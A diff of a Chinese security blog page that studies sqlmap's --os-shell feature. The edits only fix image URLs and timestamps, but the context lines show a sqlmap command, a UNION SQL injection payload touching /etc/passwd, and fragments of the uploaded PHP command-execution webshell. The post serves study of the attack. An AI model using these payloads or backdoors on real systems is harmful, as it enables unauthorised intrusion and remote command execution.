@@ -15,16 +15,16 @@
 <meta property="og:site_name" content="Sec-note">
 <meta property="og:description" content="SQLMAP --os-shell 学习">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-3-26/29338404.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-3-26/78328674.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-3-26/56328920.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-3-26/999775.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-3-26/53746434.jpg">
-<meta property="og:updated_time" content="2018-12-11T12:38:53.101Z">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/29338404.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/78328674.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/56328920.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/999775.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/53746434.jpg">
+<meta property="og:updated_time" content="2018-12-12T01:32:55.488Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLMAP --os-shell 学习">
 <meta name="twitter:description" content="SQLMAP --os-shell 学习">
-<meta name="twitter:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-3-26/29338404.jpg">
+<meta name="twitter:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/29338404.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Sec-note" type="application/atom+xml">
   
@@ -112,14 +112,14 @@
 <p>这篇分析的是<font color="red"><a href="http://www.sec-note.com/2018/01/11/SQLi_shell/" target="_blank" rel="noopener">SQL注入写shell不成功后</a></font>，对其中的高权限，但是没有文件写入权限的情况下利用。</p>
 <pre><code>sqlmap -u &quot;192.168.86.194:8000/waf/test.php?id=1&quot; --os-shell
 </code></pre><p>接下来选择执行的脚本，和路径的选择。</p>
-<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-3-26/29338404.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/29338404.jpg" alt=""></p>
 <p>两个文件</p>
 <pre><code>http://192.168.86.194:8000/waf/tmpupqwj.php     上传后门
 http://192.168.86.194:8000/waf/tmpbyiqd.php     执行系统命令后门
 </code></pre><p>抓包看上传内容。</p>
-<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-3-26/78328674.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/78328674.jpg" alt=""></p>
 <p>注入进去的内容</p>
-<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-3-26/56328920.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/56328920.jpg" alt=""></p>
 <p>URL解码</p>
 <p>好像这几个<code>payload</code>影响不大，没有进行写文件。 </p>
 <pre><code>http://127.0.0.1:8000/waf/test.php?id=1&amp;gOxn=9680 AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2&gt;1-- ../../../etc/passwd 
@@ -166,7 +166,7 @@ if (phpversion()&lt;&apos;4.1.0&apos;){
     }
     ?&gt;
 </code></pre><p>访问：可以利用这个文件进行上传大马或者其他文件。</p>
-<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-3-26/999775.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/999775.jpg" alt=""></p>
 <p><strong>tmpbyiqd.php 执行命令</strong></p>
 <pre><code>&lt;?php 
 $c=$_REQUEST[&quot;cmd&quot;];
@@ -229,7 +229,7 @@ function f($n){
         else{$w=0;}
         print &quot;&lt;pre&gt;&quot;.$w.&quot;&lt;/pre&gt;&quot;;
  ?&gt;
-</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-3-26/53746434.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-26/53746434.jpg" alt=""></p>
 <p><code>--os-shell</code>主要还是用<code>into outfile</code>将代码使用十六进制字符进行上传到服务器上，然后执行对应的操作。</p>
 <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="http://www.cnblogs.com/lcamry/p/5505110.html" target="_blank" rel="noopener">sqlmap os shell解析</a></p>
 <p><a href="http://vinc.top/2014/06/22/sqlmap-mssql-os-shell%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">【Sqlmap】os-shell详解</a></p>
@@ -237,7 +237,7 @@ function f($n){
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/26/sqlmap_os_shell/" data-id="cjpjt0n6b004m4dxdz482nclk" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/03/26/sqlmap_os_shell/" data-id="cjpki3m8e004jwgxdeu4uwfbk" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQLi/">SQLi</a></li></ul>
